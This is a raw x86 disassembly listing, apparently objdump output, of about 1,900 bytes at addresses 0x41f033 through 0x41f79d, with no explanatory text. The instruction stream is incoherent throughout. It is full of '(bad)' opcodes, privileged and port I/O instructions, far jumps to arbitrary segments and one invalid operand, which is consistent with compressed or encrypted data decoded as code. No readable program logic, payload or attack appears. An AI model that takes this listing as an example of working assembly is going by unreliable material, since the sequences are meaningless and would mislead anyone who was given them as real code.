  41f033:	xchg   esp,eax
  41f034:	sbb    ebp,DWORD PTR [edi+esi*4+0x68]
  41f038:	inc    edx
  41f039:	push   esp
  41f03a:	dec    ebx
  41f03b:	std    
  41f03c:	pop    esi
  41f03d:	cdq    
  41f03e:	ret    0x471e
  41f041:	jmp    0x41effe
  41f043:	arpl   WORD PTR [eax],bx
  41f045:	(bad)  
  41f046:	pop    edi
  41f047:	jg     0x41f00f
  41f049:	cmp    BYTE PTR [edx],ah
  41f04b:	daa    
  41f04c:	or     eax,0x4e7f4f22
  41f051:	pop    edx
  41f052:	cs retf 0xbdda
  41f056:	fwait
  41f057:	lods   al,BYTE PTR ds:[esi]
  41f058:	rcr    esp,1
  41f05a:	or     dh,BYTE PTR [bp+0x1561]
  41f05f:	shl    BYTE PTR [eax],cl
  41f061:	in     al,dx
  41f062:	adc    DWORD PTR [esi+0xd],edi
  41f065:	sub    al,0x68
  41f067:	rdpmc  
  41f069:	cli    
  41f06a:	xchg   ecx,eax
  41f06b:	fcom   QWORD PTR [ebp-0x4a]
  41f06e:	push   0xffffffd4
  41f070:	call   0x9093ced
  41f075:	test   DWORD PTR [edx+eax*2-0x6b],0xfacdd69a
  41f07d:	sbb    ebp,DWORD PTR [edx+0x4b]
  41f080:	mov    cl,0xd0
  41f082:	mov    edi,edi
  41f084:	lock data16 loop 0x41f038
  41f088:	sti    
  41f089:	inc    ebx
  41f08a:	std    
  41f08b:	add    BYTE PTR [eax-0x27],ah
  41f08e:	push   edi
  41f08f:	mov    BYTE PTR [ebp+eiz*8-0x4a89f1aa],bl
  41f096:	jge    0x41f027
  41f098:	sub    BYTE PTR [ebp-0x20],cl
  41f09b:	adc    edx,DWORD PTR [eax+0xa]
  41f09e:	pop    ss
  41f09f:	add    bh,ah
  41f0a1:	add    BYTE PTR cs:[edx+eax*1+0x7c],bl
  41f0a6:	jne    0x41f056
  41f0a8:	outs   dx,DWORD PTR ds:[esi]
  41f0a9:	stos   DWORD PTR es:[edi],eax
  41f0aa:	cs jp  0x41f0bd
  41f0ad:	gs inc esp
  41f0af:	xor    DWORD PTR [eax],ecx
  41f0b1:	popa   
  41f0b2:	lock adc esp,DWORD PTR [esi]
  41f0b5:	adc    bl,ah
  41f0b7:	loop   0x41f0c5
  41f0b9:	and    BYTE PTR [ebx-0x17614393],cl
  41f0bf:	je     0xe80a7020
  41f0c5:	out    0x13,eax
  41f0c7:	loope  0x41f0db
  41f0c9:	mov    al,0x5
  41f0cb:	scas   al,BYTE PTR es:[edi]
  41f0cc:	aas    
  41f0cd:	retf   
  41f0ce:	push   edx
  41f0cf:	cmp    BYTE PTR ds:0x8d40fe26,dl
  41f0d5:	push   ds
  41f0d6:	adc    dl,BYTE PTR [ebp+0x2a]
  41f0d9:	imul   eax,DWORD PTR [ebx-0x56],0xffffff81
  41f0dd:	jbe    0x41f0de
  41f0df:	pop    esp
  41f0e0:	leave  
  41f0e1:	mov    ah,0x1b
  41f0e3:	mov    edi,0x818976a6
  41f0e8:	fidiv  DWORD PTR [ebx+0x5a9b28a]
  41f0ee:	daa    
  41f0ef:	jmp    0xe048:0x8b77c1fc
  41f0f6:	pop    ss
  41f0f7:	dec    esp
  41f0f8:	jno    0x41f0c3
  41f0fa:	in     eax,0xea
  41f0fc:	pop    esp
  41f0fd:	test   eax,0xdaa2a97c
  41f102:	add    al,0x1d
  41f104:	outs   dx,DWORD PTR ds:[esi]
  41f105:	adc    ah,BYTE PTR [edi+ebp*1]
  41f108:	cmp    BYTE PTR [edx-0x66],0xd4
  41f10c:	sahf   
  41f10d:	aaa    
  41f10e:	test   esi,edi
  41f110:	xchg   BYTE PTR [edx-0x6c],dl
  41f113:	test   al,0x88
  41f115:	cmp    eax,0x3faa8dd8
  41f11a:	push   edx
  41f11b:	adc    eax,0x79717054
  41f120:	add    al,0x79
  41f122:	dec    ebp
  41f123:	fisttp QWORD PTR [ebx]
  41f125:	dec    ecx
  41f126:	adc    dh,BYTE PTR [ecx+0x2481a584]
  41f12c:	mov    ebp,0x530d58c7
  41f131:	mov    esi,0x2fd2e7f8
  41f136:	test   al,0x91
  41f138:	adc    eax,0xa8e8cef7
  41f13d:	mov    WORD PTR [ecx-0x2915621],gs
  41f143:	and    al,0x6f
  41f145:	cld    
  41f146:	jmp    0x41f0e7
  41f148:	mov    edx,0xcd3e3364
  41f14d:	lods   al,BYTE PTR ds:[esi]
  41f14e:	sub    esi,DWORD PTR [edx-0x75ff743d]
  41f154:	xchg   ebp,eax
  41f155:	sahf   
  41f156:	mov    ebx,0x8b796213
  41f15b:	mov    esp,DWORD PTR [ebx+0x58]
  41f15e:	add    al,0xf
  41f160:	test   eax,0xc8990ed6
  41f165:	xchg   BYTE PTR [esi],al
  41f167:	nop
  41f168:	mov    bh,0xeb
  41f16a:	push   cs
  41f16b:	aad    0x79
  41f16d:	int3   
  41f16e:	not    BYTE PTR [ecx]
  41f170:	fld    DWORD PTR ds:[ebp+ebx*4-0x91613e4]
  41f178:	call   0x12adb821
  41f17d:	js     0x41f140
  41f17f:	cmp    al,0x94
  41f181:	lods   eax,DWORD PTR ds:[esi]
  41f182:	outs   dx,DWORD PTR ds:[esi]
  41f183:	push   ebp
  41f184:	std    
  41f185:	and    DWORD PTR [esi+ebx*8],ecx
  41f188:	ffree  st(7)
  41f18a:	pop    eax
  41f18b:	not    BYTE PTR [edx-0x3e]
  41f18e:	jmp    0xf235:0x7f4e29d9
  41f195:	mov    esp,0xfc421791
  41f19a:	jae    0x41f1f7
  41f19c:	push   ecx
  41f19d:	jg     0x41f13d
  41f19f:	cwde   
  41f1a0:	fcomp  QWORD PTR [eax-0x6f87ec84]
  41f1a6:	inc    ebp
  41f1a7:	punpcklwd mm1,DWORD PTR [esi]
  41f1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ab:	or     esi,DWORD PTR [ecx]
  41f1ad:	out    0x63,al
  41f1af:	addr16 jbe 0x41f1eb
  41f1b2:	sub    eax,0xb15853c7
  41f1b7:	jmp    0x7d5eaa1
  41f1bc:	mov    eax,0x629d35f6
  41f1c1:	xchg   ebp,eax
  41f1c2:	xchg   ebp,eax
  41f1c3:	in     al,dx
  41f1c4:	out    dx,al
  41f1c5:	ret    0x6cfe
  41f1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1c9:	push   es
  41f1ca:	scas   al,BYTE PTR es:[edi]
  41f1cb:	add    dl,ah
  41f1cd:	sub    BYTE PTR [ecx+0x37],0xbf
  41f1d1:	retf   
  41f1d2:	inc    edx
  41f1d3:	pop    esp
  41f1d4:	add    eax,0x3c97e6c0
  41f1d9:	xchg   DWORD PTR [ecx],ecx
  41f1db:	ficomp WORD PTR [edx]
  41f1dd:	lds    edx,FWORD PTR [edx-0x2e2aa877]
  41f1e3:	sahf   
  41f1e4:	add    al,cl
  41f1e6:	mov    ebx,0xbb6685ab
  41f1eb:	xor    eax,0x7b576ee8
  41f1f0:	cli    
  41f1f1:	(bad)  
  41f1f2:	mov    ebp,0x591bff3d
  41f1f7:	sub    BYTE PTR [ebx-0x48],dh
  41f1fa:	stos   DWORD PTR es:[edi],eax
  41f1fb:	xchg   ebp,eax
  41f1fc:	stos   DWORD PTR es:[edi],eax
  41f1fd:	sbb    ah,bl
  41f1ff:	imul   DWORD PTR [ebx+0x69195bb2]
  41f205:	out    0xee,al
  41f207:	fwait
  41f208:	mov    cl,0xc1
  41f20a:	dec    eax
  41f20b:	std    
  41f20c:	adc    esp,DWORD PTR [ebx+0x2a]
  41f20f:	fnstenv [eax-0x54fc6397]
  41f215:	jmp    0x41f208
  41f217:	cmp    DWORD PTR [eax+edi*8],ecx
  41f21a:	pop    ds
  41f21b:	xor    eax,eax
  41f21d:	into   
  41f21e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f21f:	out    dx,al
  41f220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f221:	vpaddb xmm7,xmm3,XMMWORD PTR ds:0xbe17ae97
  41f229:	shl    BYTE PTR [esi-0xf],1
  41f22c:	inc    ebp
  41f22d:	sbb    eax,0x93c703ce
  41f232:	ja     0x41f23e
  41f234:	adc    dh,ah
  41f236:	jp     0x41f2a3
  41f238:	add    ah,BYTE PTR [ebp-0x5c08853e]
  41f23e:	jae    0x41f1fd
  41f240:	sbb    bl,BYTE PTR [ebx+0x24]
  41f243:	xchg   ebx,eax
  41f244:	mov    ecx,0x738b79b5
  41f249:	dec    edi
  41f24a:	stos   DWORD PTR es:[edi],eax
  41f24b:	test   DWORD PTR [di+0x41],esp
  41f24f:	cs cdq 
  41f251:	fstp   TBYTE PTR [edi+0x68]
  41f254:	fsub   DWORD PTR [edx-0x513a26e]
  41f25a:	sbb    DWORD PTR ds:0x19b48725,edi
  41f260:	sbb    DWORD PTR [eax],0xd311b665
  41f266:	scas   al,BYTE PTR es:[edi]
  41f267:	dec    eax
  41f268:	mov    esi,0x58c0243f
  41f26d:	popa   
  41f26e:	xchg   ecx,eax
  41f26f:	push   ebx
  41f270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f271:	add    edx,DWORD PTR [ebp+0x57]
  41f274:	test   bh,ch
  41f276:	les    ebp,FWORD PTR ds:[eax]
  41f279:	cmp    eax,0xa99c2bbd
  41f27e:	sbb    eax,0x5e3cc0fe
  41f283:	or     eax,0x759b4eef
  41f288:	mov    WORD PTR [ecx],cs
  41f28a:	mov    DWORD PTR [edi+0x396756f7],ecx
  41f290:	push   ecx
  41f291:	dec    esp
  41f292:	and    bl,BYTE PTR [ecx]
  41f294:	gs aas 
  41f296:	inc    ecx
  41f297:	xchg   ecx,eax
  41f298:	loop   0x41f246
  41f29a:	xor    dh,BYTE PTR [edi+eax*1+0x213aa0ae]
  41f2a1:	call   0xb7aed46c
  41f2a6:	push   cs
  41f2a7:	daa    
  41f2a8:	or     eax,0x4792e06c
  41f2ad:	hlt    
  41f2ae:	jmp    0xa0d0:0x689e85b0
  41f2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b6:	iret   
  41f2b7:	outs   dx,BYTE PTR ds:[esi]
  41f2b8:	push   esi
  41f2b9:	enter  0x8e4c,0x4b
  41f2bd:	retf   
  41f2be:	jecxz  0x41f32e
  41f2c0:	cmp    esi,DWORD PTR [ecx-0x682fa04c]
  41f2c6:	cmp    DWORD PTR [edi],eax
  41f2c8:	stos   DWORD PTR es:[edi],eax
  41f2c9:	adc    ch,BYTE PTR [ecx+0x54]
  41f2cc:	adc    al,0xbb
  41f2ce:	cli    
  41f2cf:	mov    ss,WORD PTR [ebx]
  41f2d1:	adc    ebx,eax
  41f2d3:	add    eax,0x39f0adfd
  41f2d8:	sub    eax,0x2e6602b3
  41f2dd:	adc    ebp,ebp
  41f2df:	and    dl,dl
  41f2e1:	jnp    0x69067bba
  41f2e7:	lds    eax,FWORD PTR [ebx+ebp*1-0x34fac368]
  41f2ee:	out    0x5e,eax
  41f2f0:	int    0xec
  41f2f2:	jp     0x41f336
  41f2f4:	inc    ebx
  41f2f5:	imul   ecx,DWORD PTR [edi-0x73],0xa3778730
  41f2fc:	rcr    DWORD PTR [eax+eax*8-0x2236f72a],0x20
  41f304:	jbe    0x41f36d
  41f306:	sub    dl,BYTE PTR [edx-0x74f1c2b7]
  41f30c:	pop    edx
  41f30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f30e:	and    cl,dl
  41f310:	daa    
  41f311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f312:	enter  0xa95e,0x13
  41f316:	gs scas al,BYTE PTR es:[edi]
  41f318:	rol    BYTE PTR [esi],0xbc
  41f31b:	les    edi,FWORD PTR [edi-0x5e537fec]
  41f321:	pop    edx
  41f322:	gs int3 
  41f324:	add    al,dl
  41f326:	jg     0x41f308
  41f328:	sub    BYTE PTR [eax+0x220e2614],dl
  41f32e:	adc    al,0x25
  41f330:	inc    dx
  41f332:	cs sub eax,0x847df8eb
  41f338:	push   edx
  41f339:	dec    edi
  41f33a:	jbe    0x41f331
  41f33c:	sub    ebp,DWORD PTR [esp+esi*2+0x1aa6e588]
  41f343:	and    ebx,DWORD PTR [eax-0x7d]
  41f346:	call   edi
  41f348:	dec    esi
  41f349:	pop    ebp
  41f34a:	and    dl,BYTE PTR [esi-0x5]
  41f34d:	fdiv   DWORD PTR [ecx+0xde50d58]
  41f353:	(bad)
  41f356:	addr16 nop
  41f358:	sub    al,0xef
  41f35a:	iret   
  41f35b:	xor    BYTE PTR [edx-0x1621b5ec],dh
  41f361:	push   ebx
  41f362:	fld    TBYTE PTR [ebx]
  41f364:	cld    
  41f365:	test   dl,bh
  41f367:	sbb    dl,BYTE PTR [ebx-0x13]
  41f36a:	mov    WORD PTR [esi-0x41],cs
  41f36d:	(bad)  
  41f36e:	(bad)  
  41f370:	add    ah,BYTE PTR [ebx]
  41f372:	nop
  41f373:	popa   
  41f374:	(bad)  
  41f376:	jle    0x41f336
  41f378:	mov    gs,WORD PTR [ebx-0x69dd146a]
  41f37e:	(bad)  
  41f37f:	daa    
  41f380:	rol    BYTE PTR [edi-0x6b],0xa8
  41f384:	dec    esp
  41f385:	ds pop esp
  41f387:	inc    edx
  41f388:	xchg   DWORD PTR [ebx+0x65],ecx
  41f38b:	jmp    0x41f355
  41f38d:	mov    ch,0x1
  41f390:	aas    
  41f391:	dec    edx
  41f392:	xor    ebx,edi
  41f394:	mov    esi,0x58615696
  41f399:	cmc    
  41f39a:	ficom  DWORD PTR [edx-0x441dc775]
  41f3a0:	scas   al,BYTE PTR es:[edi]
  41f3a1:	jp     0x41f3af
  41f3a3:	fs ret 0x7960
  41f3a7:	(bad)  
  41f3a9:	sub    cl,BYTE PTR [esi-0x11]
  41f3ac:	ror    eax,1
  41f3ae:	dec    eax
  41f3af:	xchg   ebx,eax
  41f3b0:	ret    
  41f3b1:	rcl    BYTE PTR [eax+ebp*1+0x161b951f],0x4b
  41f3b9:	or     eax,0x508168d2
  41f3be:	mov    ds:0x4be173b6,eax
  41f3c3:	push   eax
  41f3c4:	pop    esi
  41f3c5:	mov    edx,0xfdbf31fb
  41f3ca:	scas   al,BYTE PTR es:[edi]
  41f3cb:	imul   ebx,DWORD PTR [edx+0x49cbbdd3],0x4cfd5a4c
  41f3d5:	pop    esi
  41f3d6:	sbb    eax,0x8019fcfa
  41f3db:	pop    edx
  41f3dc:	ds xchg ebp,eax
  41f3de:	fisub  DWORD PTR [eax+eiz*8]
  41f3e1:	inc    esi
  41f3e2:	(bad)  
  41f3e4:	push   ds
  41f3e5:	call   0x34e7:0x1a112b5a
  41f3ec:	xchg   esp,eax
  41f3ed:	pop    edi
  41f3ee:	and    eax,0xd3ed05ae
  41f3f3:	xchg   esp,eax
  41f3f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3f5:	shr    DWORD PTR [eax-0x71],0xd3
  41f3f9:	scas   al,BYTE PTR es:[edi]
  41f3fa:	mov    ah,0xc7
  41f3fc:	popf   
  41f3fd:	inc    ebp
  41f3fe:	scas   eax,DWORD PTR es:[edi]
  41f3ff:	jge    0x41f397
  41f401:	stos   DWORD PTR es:[edi],eax
  41f402:	clc    
  41f403:	lahf   
  41f404:	bound  edx,QWORD PTR [eax]
  41f406:	or     eax,0x240d5b8
  41f40b:	sub    cl,0x5e
  41f40e:	dec    eax
  41f40f:	adc    DWORD PTR [edx+edi*1],ecx
  41f412:	and    dh,BYTE PTR [ebx+0x19]
  41f415:	inc    esi
  41f416:	hlt    
  41f417:	aaa    
  41f418:	cmp    eax,0x7ae9cf7f
  41f41d:	arpl   WORD PTR [ecx-0x1aac39e0],si
  41f423:	aaa    
  41f424:	add    eax,0x79617f52
  41f429:	xor    DWORD PTR [ebp-0x5b],eax
  41f42c:	dec    ebp
  41f42d:	xchg   ebx,eax
  41f42e:	out    0xec,al
  41f430:	mov    esi,0xfdf5a91
  41f435:	fadd   DWORD PTR [ecx+0x55]
  41f438:	add    dh,BYTE PTR [ebp+0x44]
  41f43b:	jne    0x41f3cf
  41f43d:	mov    dh,BYTE PTR [edi-0x1f]
  41f440:	jl     0x41f48f
  41f442:	xchg   esi,eax
  41f443:	add    ebx,ebx
  41f445:	push   0x4e
  41f447:	out    dx,al
  41f448:	push   eax
  41f449:	out    dx,eax
  41f44a:	jl     0x41f42b
  41f44c:	mov    ds:0x47c7135c,eax
  41f451:	retf   
  41f452:	loopne 0x41f48c
  41f454:	sbb    ebx,DWORD PTR [esi-0x40]
  41f457:	ret    
  41f458:	xor    eax,0xcba37ea
  41f45d:	pop    esi
  41f45e:	jnp    0x41f4a2
  41f460:	mov    ebx,0xce2e898f
  41f465:	xchg   ebp,eax
  41f466:	pop    ebx
  41f467:	jge    0x41f432
  41f469:	shr    BYTE PTR [eax],0xbf
  41f46c:	pop    eax
  41f46d:	iret   
  41f46e:	or     DWORD PTR [eax+0x2d2c445b],ebx
  41f474:	neg    DWORD PTR [edi-0x23]
  41f477:	icebp  
  41f478:	sub    al,0x8c
  41f47a:	ret    
  41f47b:	jae    0x41f458
  41f47d:	xor    BYTE PTR [eax],cl
  41f47f:	and    eax,0xb0bd1b93
  41f484:	aaa    
  41f485:	or     al,ch
  41f487:	ss stc 
  41f489:	xor    al,BYTE PTR [ebx]
  41f48b:	inc    ebp
  41f48c:	les    edx,FWORD PTR [esi+0x70]
  41f48f:	lock pop edi
  41f491:	or     DWORD PTR [eax],esi
  41f493:	(bad)  
  41f494:	or     eax,0xfe9ccdb3
  41f499:	push   edx
  41f49a:	imul   BYTE PTR [eax+0x55b64231]
  41f4a0:	(bad)  
  41f4a1:	retf   
  41f4a2:	mov    DWORD PTR [ecx-0x2f],esi
  41f4a5:	mov    ds:0xa29d02a5,al
  41f4aa:	mov    edi,0x77514cfe
  41f4af:	lods   eax,DWORD PTR ds:[esi]
  41f4b0:	jge    0x41f510
  41f4b2:	add    ecx,edi
  41f4b4:	daa    
  41f4b5:	into   
  41f4b6:	cmp    al,0x50
  41f4b8:	popf   
  41f4b9:	ror    BYTE PTR [esi-0x589464e6],1
  41f4bf:	sbb    al,0xb9
  41f4c1:	push   ebx
  41f4c2:	dec    edi
  41f4c3:	inc    ebp
  41f4c4:	pop    es
  41f4c5:	adc    eax,0xb73a899
  41f4ca:	inc    edi
  41f4cb:	popf   
  41f4cc:	pushf  
  41f4cd:	xchg   DWORD PTR [esi],edx
  41f4cf:	pop    esp
  41f4d0:	sbb    al,0xc6
  41f4d2:	mov    edi,0x62d03703
  41f4d7:	stc    
  41f4d8:	mov    esi,0x347abc2d
  41f4dd:	test   DWORD PTR [edi+0x409a15e3],esp
  41f4e3:	pop    esp
  41f4e4:	addr16 jmp 0xfbd:0x42271cbb
  41f4ec:	xor    esp,ebx
  41f4ee:	mov    al,BYTE PTR [ecx-0x5f]
  41f4f1:	mov    edx,0xbde691e
  41f4f6:	sti    
  41f4f7:	mul    DWORD PTR [eax+0x2f]
  41f4fa:	sbb    bh,BYTE PTR [eax]
  41f4fc:	imul   esp,DWORD PTR [edi*1-0x1aef6586],0xe
  41f504:	sub    dl,dl
  41f506:	jb     0x41f4ef
  41f508:	in     al,0x5a
  41f50a:	jbe    0x41f4c7
  41f50c:	cmp    al,BYTE PTR ds:0x37fadcea
  41f512:	pop    ss
  41f513:	pop    edx
  41f514:	je     0x41f4bd
  41f516:	outs   dx,DWORD PTR ds:[esi]
  41f517:	sub    dh,ch
  41f519:	mov    eax,ds:0x4899190e
  41f51e:	xchg   DWORD PTR [eax+0x2ff94f2b],ebp
  41f524:	cmp    al,0xf
  41f526:	cmp    ebp,ebx
  41f528:	cs cmp eax,0xd917bd15
  41f52e:	js     0x41f50b
  41f530:	arpl   WORD PTR [edi-0x51],bp
  41f533:	adc    al,cl
  41f535:	inc    ecx
  41f536:	push   eax
  41f537:	lods   al,BYTE PTR ds:[esi]
  41f538:	mov    ds:0x8fe05859,eax
  41f53d:	stc    
  41f53e:	lock xor BYTE PTR [ebx],bl
  41f541:	push   esi
  41f542:	shr    DWORD PTR [ecx],0xf4
  41f545:	aad    0xa4
  41f547:	dec    DWORD PTR [ebx]
  41f549:	mov    ecx,0x89be3876
  41f54e:	sbb    BYTE PTR [edx-0x4cde259e],al
  41f554:	aaa    
  41f555:	(bad)  
  41f556:	xchg   esp,eax
  41f557:	inc    eax
  41f558:	es int 0x9b
  41f55b:	xor    BYTE PTR [ebx+0x24],dh
  41f55e:	loopne 0x41f592
  41f560:	imul   ebx,DWORD PTR [ecx-0x40],0x7897da68
  41f567:	mov    dl,0x5a
  41f569:	mov    BYTE PTR [ecx+0x1ac4f073],bh
  41f56f:	fs xchg ecx,eax
  41f571:	(bad)  
  41f573:	push   0xe4fd0d05
  41f578:	std    
  41f579:	scas   al,BYTE PTR es:[edi]
  41f57a:	sub    al,cl
  41f57c:	pop    edi
  41f57d:	sbb    eax,0xb7209871
  41f582:	popa   
  41f583:	pop    ds
  41f584:	in     al,0xa8
  41f586:	xchg   edx,eax
  41f587:	pop    ebp
  41f588:	dec    edx
  41f589:	adc    eax,0xd336a3e
  41f58e:	popa   
  41f58f:	inc    esp
  41f590:	jo     0x41f589
  41f592:	add    bh,ah
  41f594:	outs   dx,DWORD PTR ds:[esi]
  41f595:	cdq    
  41f596:	cwde   
  41f597:	ret    
  41f598:	inc    edi
  41f599:	(bad)  
  41f59a:	clc    
  41f59b:	pushf  
  41f59c:	pop    esp
  41f59d:	xor    BYTE PTR [esi],bl
  41f59f:	inc    ebx
  41f5a0:	push   eax
  41f5a1:	add    esi,DWORD PTR [eax-0x1680dc61]
  41f5a7:	ds pop ds
  41f5a9:	mov    al,0x65
  41f5ab:	and    ecx,ebx
  41f5ad:	mov    bh,0x76
  41f5af:	fcom   st(6)
  41f5b1:	shr    BYTE PTR [ebx+0x733630bb],cl
  41f5b7:	fwait
  41f5b8:	popa   
  41f5b9:	push   ss
  41f5ba:	pusha  
  41f5bb:	push   edi
  41f5bc:	push   cs
  41f5bd:	stos   BYTE PTR es:[edi],al
  41f5be:	jle    0x41f572
  41f5c0:	lock push ss
  41f5c2:	int3   
  41f5c3:	inc    DWORD PTR [edi-0x2a9ecfdb]
  41f5c9:	sub    ebx,eax
  41f5cb:	sub    DWORD PTR [edi-0x31],eax
  41f5ce:	push   ebx
  41f5cf:	pop    ebx
  41f5d0:	mov    fs,WORD PTR [edx+0x2c1fbcee]
  41f5d6:	mov    ah,0x64
  41f5d8:	(bad)  
  41f5da:	xor    esp,DWORD PTR [ebx+0x1b1172c8]
  41f5e0:	dec    ebp
  41f5e1:	cmova  esp,DWORD PTR [eax-0x3ecf2420]
  41f5e8:	das    
  41f5e9:	sub    DWORD PTR [esp+edi*1-0x75],esp
  41f5ed:	xlat   BYTE PTR ds:[ebx]
  41f5ee:	(bad)  
  41f5ef:	cdq    
  41f5f0:	test   BYTE PTR [ebp+0x4e],bh
  41f5f3:	popf   
  41f5f4:	pop    eax
  41f5f5:	cmp    edi,DWORD PTR [edi]
  41f5f7:	loopne 0x41f5d0
  41f5f9:	xchg   esp,eax
  41f5fa:	daa    
  41f5fb:	add    BYTE PTR [eax+0x5e],cl
  41f5fe:	cwde   
  41f5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f600:	outs   dx,DWORD PTR ds:[esi]
  41f601:	clc    
  41f602:	jns    0x41f612
  41f604:	xchg   ebp,eax
  41f605:	inc    ebx
  41f606:	sbb    cl,dl
  41f608:	mov    ebp,0xe145c604
  41f60d:	xor    BYTE PTR [eax-0x7eb7aa04],dl
  41f613:	fs push 0x48d36ab
  41f619:	scas   eax,DWORD PTR es:[edi]
  41f61a:	push   0x4903c783
  41f61f:	adc    ch,ah
  41f621:	mov    ebp,0xd93e3d5d
  41f626:	fld    DWORD PTR [edi-0x3e417494]
  41f62c:	adc    edi,DWORD PTR [ebx+ebx*1]
  41f62f:	repnz push 0xf2412d32
  41f635:	leave  
  41f636:	or     al,dh
  41f638:	fild   QWORD PTR [ebp+0x32ca53d7]
  41f63e:	xor    eax,0xf0a3d725
  41f643:	int3   
  41f644:	mov    esp,DWORD PTR [ebx+eax*1-0x52188134]
  41f64b:	sub    al,0x5d
  41f64d:	sahf   
  41f64e:	push   0x30
  41f650:	arpl   WORD PTR [ebx+0x6b8fea04],sp
  41f656:	push   ebp
  41f657:	and    DWORD PTR [ebp+0x54],ebx
  41f65a:	mov    edx,ebx
  41f65c:	cmp    DWORD PTR [esi+ebx*8+0x8e884c7],0xffffffd2
  41f664:	jbe    0x41f5fa
  41f666:	aam    0xf1
  41f668:	mov    bh,0x89
  41f66a:	(bad)  
  41f66b:	add    al,BYTE PTR [ebp+0xd6e2585]
  41f671:	cdq    
  41f672:	ins    DWORD PTR es:[edi],dx
  41f673:	xchg   esi,eax
  41f674:	fisttp WORD PTR [edx]
  41f676:	mov    bl,ah
  41f678:	mov    al,0x77
  41f67a:	jl     0x41f6af
  41f67c:	popa   
  41f67d:	pop    ds
  41f67e:	mov    esi,0x84a900e8
  41f683:	xchg   al,bh
  41f685:	push   0xf4aeb132
  41f68a:	mov    ah,0x26
  41f68c:	ds popa 
  41f68e:	and    BYTE PTR [ecx],0xa6
  41f691:	add    cl,0x7f
  41f694:	loopne 0x41f6f9
  41f696:	dec    ebp
  41f697:	call   0xc4b7:0xdbf0c3d6
  41f69e:	and    BYTE PTR [eax],0xa8
  41f6a1:	mov    ah,0xd6
  41f6a3:	push   eax
  41f6a4:	mov    ebp,DWORD PTR [si+0x721e]
  41f6a9:	in     al,dx
  41f6aa:	xor    DWORD PTR [ecx+0x25],edx
  41f6ad:	int3   
  41f6ae:	or     al,0x62
  41f6b0:	sub    ebp,0xffffffa0
  41f6b3:	xchg   ecx,eax
  41f6b4:	nop
  41f6b5:	bound  edx,QWORD PTR [ebx-0x80]
  41f6b8:	inc    ebx
  41f6b9:	sub    ch,bh
  41f6bb:	sti    
  41f6bc:	icebp  
  41f6bd:	ret    0x956d
  41f6c0:	adc    BYTE PTR [ebx-0x6fbf68c9],dh
  41f6c6:	sbb    BYTE PTR [esi+0xb],bl
  41f6c9:	cmp    DWORD PTR [eax+edx*1],edi
  41f6cc:	lock sbb eax,0x1f9aab0f
  41f6d2:	jbe    0x41f697
  41f6d4:	fs jo  0x41f710
  41f6d7:	adc    cl,BYTE PTR [eax+eiz*1-0x52]
  41f6db:	inc    ebx
  41f6dc:	push   esi
  41f6dd:	mov    al,ds:0x3ed57a31
  41f6e2:	inc    edi
  41f6e3:	mov    BYTE PTR [eax],ch
  41f6e5:	mov    al,ds:0x49241656
  41f6ea:	push   esp
  41f6eb:	mov    esi,0xf92995b9
  41f6f0:	ror    BYTE PTR [edx],cl
  41f6f2:	(bad)
  41f6f6:	(bad)  
  41f6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f8:	and    bl,BYTE PTR [eax]
  41f6fa:	inc    esp
  41f6fb:	sbb    ebp,DWORD PTR [ebx]
  41f6fd:	jns    0x41f6e2
  41f6ff:	pop    ecx
  41f700:	scas   al,BYTE PTR es:[edi]
  41f701:	inc    eax
  41f702:	mov    ebx,0xef056822
  41f707:	sbb    ebx,0xffffffa1
  41f70a:	out    dx,al
  41f70b:	jl     0x41f77f
  41f70d:	push   edi
  41f70e:	dec    esp
  41f70f:	mov    cl,0x6
  41f711:	lods   al,BYTE PTR ds:[esi]
  41f712:	imul   ebx,DWORD PTR [ebp-0x5b],0x38b95623
  41f719:	je     0x41f716
  41f71b:	jb     0x41f6f1
  41f71d:	scas   al,BYTE PTR es:[edi]
  41f71e:	pop    es
  41f71f:	sbb    eax,0x3334e2a9
  41f724:	add    ah,bh
  41f726:	inc    edi
  41f727:	repnz aas 
  41f729:	sbb    BYTE PTR [eax-0x36],dh
  41f72c:	clc    
  41f72d:	jns    0x41f6d5
  41f72f:	mov    bl,BYTE PTR [edx-0x4a]
  41f732:	add    ecx,DWORD PTR [edi]
  41f734:	loopne 0x41f7a3
  41f736:	mov    es:0x279e2396,eax
  41f73c:	mov    WORD PTR [ebp+0x4dca4880],cs
  41f742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f744:	xchg   ah,al
  41f746:	int3   
  41f747:	and    al,0x96
  41f749:	xchg   esp,eax
  41f74a:	lea    ebx,[esi-0x6d]
  41f74d:	sbb    eax,0xe65b0c8b
  41f752:	les    edx,FWORD PTR [ebx-0x1c070eb0]
  41f758:	pushf  
  41f759:	clc    
  41f75a:	sbb    esi,DWORD PTR [eax+0x66]
  41f75d:	in     eax,dx
  41f75e:	and    ecx,DWORD PTR [edi-0x26]
  41f761:	inc    esi
  41f762:	sub    dh,dl
  41f764:	push   ebp
  41f765:	mov    ?,WORD PTR [eax+0x5c]
  41f768:	dec    eax
  41f769:	mov    bl,0x1c
  41f76b:	jmp    0x5749:0x82181f40
  41f772:	outs   dx,BYTE PTR ds:[esi]
  41f773:	push   ebp
  41f774:	sar    DWORD PTR fs:[ecx+esi*2-0x2],cl
  41f779:	lds    edx,FWORD PTR [edx]
  41f77b:	pop    ss
  41f77c:	and    al,0x1d
  41f77e:	jne    0x41f744
  41f780:	add    dl,BYTE PTR ds:0x72555125
  41f786:	inc    esi
  41f787:	dec    ecx
  41f788:	lahf   
  41f789:	lock inc eax
  41f78b:	stc    
  41f78c:	fsub   st(3),st
  41f78e:	sbb    DWORD PTR [ebp-0x5ecd84c8],esp
  41f794:	(bad)  
  41f796:	sbb    al,0x99
  41f798:	leave  
  41f799:	or     edx,DWORD PTR [eax]
  41f79b:	push   edx
  41f79c:	inc    edi
  41f79d:	add    al,0xc7
